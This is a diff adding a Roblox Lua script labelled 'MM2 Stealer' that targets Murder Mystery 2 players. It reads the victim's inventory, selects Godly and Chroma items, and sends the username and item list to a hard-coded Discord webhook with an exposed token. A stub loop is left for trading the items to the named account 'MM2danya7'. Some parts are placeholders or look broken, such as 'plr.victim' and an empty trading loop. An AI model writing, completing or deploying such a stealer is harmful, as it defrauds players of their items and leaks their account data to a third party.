@@ -1,0 +1,120 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local plr = Players.LocalPlayer
+
+getgenv().user = "MM2danya7"
+local webhook = "https://discord.com/api/webhooks/1417171931693584466/F_sTxNCu9VQTRMw0EFUN-hMmbJXHb-a4nEHJY2ixhrCaiWbvjMSDRS3XCodgx29n9FDA"
+
+-- Get victim's inventory data
+local profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.victim)
+
+-- Populate the database with actual item information
+local database = {
+    ["RedLuger"] = {ItemName = "RedLuger", Rarity = "Godly"},
+    ["FadeChroma"] = {ItemName = "FadeChroma", Rarity = "Chroma"},
+}
+local rarityTable = {"Common", "Uncommon", "Rare", "Epic", "Legendary", "Godly", "Chroma"}
+local min_rarityindex = 5
+
+-- Method 1: Get all items from ReplicatedStorage (recommended)
+local function populateDatabase()
+    -- Look for weapons in ReplicatedStorage
+    local weaponsFolder = ReplicatedStorage:FindFirstChild("Weapons") or ReplicatedStorage:FindFirstChild("Items")
+    
+    if weaponsFolder then
+        for _, weapon in pairs(weaponsFolder:GetChildren()) do
+            if weapon:IsA("Tool") or weapon:IsA("Model") then
+                local config = weapon:FindFirstChild("Config") or weapon:FindFirstChild("Configuration")
+                if config then
+                    local rarity = config:FindFirstChild("Rarity") or config:FindFirstChild("RarityValue")
+                    local itemName = config:FindFirstChild("ItemName") or weapon.Name
+                    
+                    if rarity and itemName then
+                        database[weapon.Name] = {
+                            ItemName = itemName.Value,
+                            Rarity = rarity.Value
+                        }
+                    end
+                end
+            end
+        end
+    end
+    
+    -- Alternative: Use remote events to get item data
+    if next(database) == nil then -- If database is still empty
+        local success, itemsData = pcall(function()
+            return ReplicatedStorage.Remotes.Inventory.GetItemsData:InvokeServer()
+        end)
+        
+        if success and itemsData then
+            for dataId, itemInfo in pairs(itemsData) do
+                database[dataId] = {
+                    ItemName = itemInfo.Name or tostring(dataId),
+                    Rarity = itemInfo.Rarity or "Unknown"
+                }
+            end
+        end
+    end
+end
+
+-- Populate the database
+populateDatabase()
+
+-- определение предметов для отправки
+local send_wpn = {}
+for dataid, amount in pairs(profileData.Weapons.Owned) do
+    local itemInfo = database[dataid]
+    if itemInfo then
+        local rarityIndex = table.find(rarityTable, itemInfo.Rarity)
+        if rarityIndex and rarityIndex >= min_rarityindex then
+            table.insert(send_wpn, {
+                DataID = itemInfo.ItemName,
+                Rarity = itemInfo.Rarity,
+                Amount = amount
+            })
+        end
+    end
+end
+
+-- Rest of your webhook and trading code...
+if #send_wpn > 0 then
+    local function formatItems(items)
+        local str = ""
+        for _, item in ipairs(items) do
+            str = str .. string.format("%s (x%s) - %s\n", item.DataID, item.Amount, item.Rarity)
+        end
+        if str == "" then str = "None" end
+        return str
+    end
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "MM2 Stealer",
+            ["color"] = 0x0663EE,
+            ["fields"] = {
+                {name = "Username", value = plr.Name, inline = true},
+                {name = "Items", value = formatItems(send_wpn), inline = false}
+            },
+            ["footer"] = {["text"] = "mm2 by vexadez"},
+            ["image"] = {["url"] = "image.png"}
+        }}
+    }
+
+    if request then
+        request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    else
+        warn("request library not found!")
+    end
+end
+
+-- Trading loop...
+while true do
+    -- Your trading code here...
+    task.wait(5)
+end
